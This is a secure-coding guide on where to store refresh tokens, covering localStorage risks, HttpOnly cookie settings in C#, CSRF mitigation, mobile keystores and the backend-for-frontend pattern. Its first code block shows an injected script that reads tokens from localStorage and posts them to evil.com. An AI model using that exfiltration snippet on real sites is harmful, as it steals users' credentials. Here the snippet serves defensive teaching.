---
type: "WARNING"
title: "Refresh Token Storage"
---

## Where to Store Refresh Tokens

The storage location for refresh tokens is critical for security. Different storage mechanisms have different vulnerability profiles.

### Browser localStorage - NEVER Use for Sensitive Tokens

**The Problem:** localStorage is accessible to any JavaScript on the page. One XSS vulnerability and an attacker can read ALL stored tokens.

```javascript
// Attacker's injected script
fetch('https://evil.com/steal', {
  method: 'POST',
  body: JSON.stringify({
    accessToken: localStorage.getItem('access_token'),
    refreshToken: localStorage.getItem('refresh_token')  // STOLEN!
  })
});
```

**Why Developers Use It:** It is easy. Tokens persist across browser sessions. Works with any SPA framework.

**Why It Is Dangerous:** XSS is the most common web vulnerability. Even if YOUR code is secure, third-party scripts (analytics, chat widgets, CDN-hosted libraries) can be compromised.

### HttpOnly Cookies - Recommended for Web Applications

**The Solution:** Store refresh tokens in HttpOnly cookies. JavaScript cannot access HttpOnly cookies.

```csharp
Response.Cookies.Append("refreshToken", refreshToken, new CookieOptions
{
    HttpOnly = true,        // JavaScript cannot access
    Secure = true,          // HTTPS only
    SameSite = SameSiteMode.Strict,  // CSRF protection
    Expires = DateTimeOffset.UtcNow.AddDays(7),
    Path = "/api/token/refresh"  // Only sent to refresh endpoint
});
```

**Key Settings:**
- `HttpOnly = true` - Cannot be read by JavaScript
- `Secure = true` - Only transmitted over HTTPS
- `SameSite = Strict` - Prevents CSRF attacks
- `Path = "/api/token/refresh"` - Only sent when refreshing, not every request

### CSRF Protection with HttpOnly Cookies

**The New Concern:** While HttpOnly cookies prevent XSS token theft, they create a CSRF risk. The browser automatically sends cookies, so an attacker could trick your browser into making requests.

**Mitigation:** Use `SameSite=Strict` (cookies only sent for same-origin requests) or implement CSRF tokens for the refresh endpoint.

### Mobile App Storage

For mobile apps, use platform-specific secure storage:

**iOS:**
- Keychain Services (encrypted, hardware-backed on modern devices)
- Never use UserDefaults

**Android:**
- EncryptedSharedPreferences (API 23+)
- Android Keystore for key material
- Never use regular SharedPreferences

### Backend-for-Frontend (BFF) Pattern

For maximum security in SPAs, consider the BFF pattern:

1. Your SPA never handles tokens directly
2. A backend service (the BFF) holds the tokens
3. SPA authenticates with the BFF using session cookies
4. BFF adds JWT to upstream API calls

```
User <-> SPA <--(session cookie)--> BFF <--(JWT)--> API
```

**Benefits:**
- Tokens never reach the browser
- Session cookies are HttpOnly
- Full control over token lifecycle
- Can implement server-side revocation easily

**Drawbacks:**
- Additional infrastructure
- Latency for adding the extra hop
- More complex deployment

### Summary: Storage Recommendations

| Application Type | Recommended Storage |
|-----------------|--------------------|
| Server-rendered web app | HttpOnly cookies |
| SPA (less sensitive) | HttpOnly cookies via BFF or secure API |
| SPA (high security) | BFF pattern |
| iOS app | Keychain Services |
| Android app | EncryptedSharedPreferences |
| Desktop app | OS credential manager |

**Never Use:**
- localStorage or sessionStorage for tokens
- Unencrypted files
- URL parameters
- Plain SharedPreferences (Android)
- UserDefaults (iOS)